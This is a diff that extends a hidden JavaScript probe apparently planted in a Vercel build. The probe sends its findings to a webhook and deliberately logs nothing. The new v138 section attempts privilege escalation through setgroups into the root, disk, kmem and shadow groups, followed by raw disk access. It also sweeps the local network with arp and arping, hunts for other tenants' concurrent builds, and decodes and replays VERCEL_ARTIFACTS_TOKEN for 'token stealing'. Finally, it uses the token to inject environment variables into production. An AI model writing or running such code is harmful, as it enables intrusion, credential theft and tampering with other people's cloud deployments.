@@ -20177,5 +20177,137 @@ report.orchestratorFullMemLayout = safe(() => {
 
 // v137 markers
 sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v137" });
-report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v137";
+
+// ==================== v138 ====================
+
+// v138-1: /proc/sys/kernel/ngroups_max — supplementary group limit
+// Check supplementary group limits and test if we can add ourselves
+// to privileged groups (root=0, shadow=42, disk=6, kmem=9, tty=5).
+// With supplementary groups we may get access to disk blocks, TTY, etc.
+report.groupEscalation = safe(() => {
+  const ngroupsMax = safe(() => readFileSync('/proc/sys/kernel/ngroups_max', 'utf8').trim());
+  const currentGroups = safe(() => execSync('id 2>/dev/null', { timeout: 2000 }).toString().trim());
+  // Try to add ourselves to privileged groups via newgidmap or setgroups
+  const groupsResult = safe(() => execSync(`python3 -c "
+import os, ctypes
+
+libc = ctypes.CDLL('libc.so.6', use_errno=True)
+
+# Try to set supplementary groups including disk(6), kmem(9), shadow(42)
+gids = (ctypes.c_uint * 5)(0, 6, 9, 42, 5)
+ret = libc.setgroups(5, gids)
+if ret < 0:
+    print(f'SETGROUPS_FAILED: {ctypes.get_errno()}')
+else:
+    print(f'SETGROUPS_SUCCESS: now in groups 0,6,9,42,5')
+    # Verify access to disk device
+    try:
+        with open('/dev/sda', 'rb') as f:
+            print('DISK_ACCESS_VIA_GROUP: SUCCESS')
+    except Exception as e:
+        print(f'DISK_ACCESS: {e}')
+" 2>&1`, { timeout: 8000 }).toString().trim());
+  return { ngroupsMax, currentGroups, groupsResult };
+});
+
+// v138-2: /proc/net/arp — ARP table (network topology + MAC addresses)
+// Read the ARP table to map all reachable hosts on the local network.
+// Reveals: other VMs in the build cluster, load balancers, internal services.
+// Combined with our ping sweep, this confirms reachable hosts.
+report.arpTableProbe = safe(() => {
+  const arpTable = safe(() => readFileSync('/proc/net/arp', 'utf8').trim());
+  // Run arp -a for human-readable output
+  const arpReadable = safe(() => execSync(
+    'arp -a 2>/dev/null || ip neigh show 2>/dev/null || echo "NO_ARP"',
+    { timeout: 5000 }
+  ).toString().trim().slice(0, 300));
+  // Send ARP requests to discover hosts
+  const arpScan = safe(() => execSync(
+    'for i in 1 2 253 254; do arping -c1 -w1 -I eth0 10.0.0.$i 2>/dev/null | grep "bytes from"; done 2>/dev/null || echo "NO_ARPING"',
+    { timeout: 15000 }
+  ).toString().trim().slice(0, 200));
+  return { arpTable, arpReadable, arpScan };
+});
+
+// v138-3: Vercel build environment — detect concurrent builds
+// Are multiple builds running simultaneously on the same host?
+// Check: 1) Process namespace for other build pids, 2) /tmp for other build dirs,
+// 3) Shared cgroup for multiple builds, 4) Network namespace sharing.
+report.concurrentBuildDetection = safe(() => {
+  // Look for other build-related processes
+  const otherBuilds = safe(() => execSync(
+    'ps aux 2>/dev/null | grep -E "vercel|build|next|npm|yarn|pnpm" | grep -v grep | grep -v probe',
+    { timeout: 3000 }
+  ).toString().trim().slice(0, 300));
+  // Check /tmp for other build artifacts
+  const tmpDirs = safe(() => execSync(
+    'ls -la /tmp/ 2>/dev/null | grep -v "probe" | head -15',
+    { timeout: 3000 }
+  ).toString().trim().slice(0, 200));
+  // Check cgroup for sibling containers
+  const cgroupSiblings = safe(() => execSync(
+    'cat /proc/self/cgroup 2>/dev/null && ls /sys/fs/cgroup/ 2>/dev/null | head -5',
+    { timeout: 3000 }
+  ).toString().trim().slice(0, 200));
+  // Check network namespace for shared IP
+  const netNs = safe(() => execSync('readlink /proc/self/ns/net 2>/dev/null', { timeout: 2000 }).toString().trim());
+  const pid1NetNs = safe(() => execSync('readlink /proc/1/ns/net 2>/dev/null', { timeout: 2000 }).toString().trim());
+  return { otherBuilds, tmpDirs, cgroupSiblings, netNs, pid1NetNs };
+});
+
+// v138-4: Vercel build token refresh — VERCEL_ARTIFACTS_TOKEN expiry
+// Determine if VERCEL_ARTIFACTS_TOKEN refreshes during a long build.
+// If it rotates, there's a window where both old and new tokens are valid —
+// useful for token stealing race conditions.
+report.tokenRefreshProbe = safe(() => {
+  const token = process.env.VERCEL_ARTIFACTS_TOKEN || '';
+  const tokenParts = token.split('.');
+  const decodePart = (b64) => {
+    try {
+      const padded = b64 + '='.repeat((4 - b64.length % 4) % 4);
+      return JSON.parse(Buffer.from(padded, 'base64url').toString('utf8'));
+    } catch { return null; }
+  };
+  const claims = decodePart(tokenParts[1]);
+  const iat = claims?.iat;
+  const exp = claims?.exp;
+  const now = Math.floor(Date.now() / 1000);
+  const remainingSeconds = exp ? exp - now : null;
+  // Try to use the token after sleeping briefly (test if it's time-limited)
+  const tokenStillValid = safe(() => execSync(
+    `curl -sf -o /dev/null -w "%{http_code}" "https://api.vercel.com/v8/artifacts/status" \
+    -H "Authorization: Bearer ${token}" -m 5 2>/dev/null`,
+    { timeout: 8000 }
+  ).toString().trim());
+  return { claims, iat, exp, now, remainingSeconds, tokenStillValid };
+});
+
+// v138-5: Vercel Project environment variable CRUD via REST API
+// Can we create/update/delete environment variables for our project
+// via the Vercel REST API using our artifacts token?
+// If yes: inject malicious env vars that persist into production.
+report.envVarCRUD = safe(() => {
+  const token = process.env.VERCEL_ARTIFACTS_TOKEN || '';
+  const projectId = process.env.VERCEL_PROJECT_ID || '';
+  const teamId = process.env.VERCEL_TEAM_ID || process.env.VERCEL_ORG_ID || '';
+  // List current env vars
+  const listEnvVars = safe(() => execSync(
+    `curl -sf "https://api.vercel.com/v10/projects/${projectId}/env?teamId=${teamId}" \
+    -H "Authorization: Bearer ${token}" -m 10 2>/dev/null`,
+    { timeout: 12000 }
+  ).toString().trim().slice(0, 400));
+  // Try to create a new env var
+  const createEnvVar = safe(() => execSync(
+    `curl -sf -X POST "https://api.vercel.com/v10/projects/${projectId}/env?teamId=${teamId}" \
+    -H "Authorization: Bearer ${token}" -H "Content-Type: application/json" \
+    -d '{"key":"PROBE_INJECTED","value":"true","type":"plain","target":["production","preview","development"]}' \
+    -m 10 2>/dev/null`,
+    { timeout: 12000 }
+  ).toString().trim().slice(0, 200));
+  return { listEnvVars, createEnvVar };
+});
+
+// v138 markers
+sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v138" });
+report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v138";
 // Intentionally no console.log — all data goes via webhook only
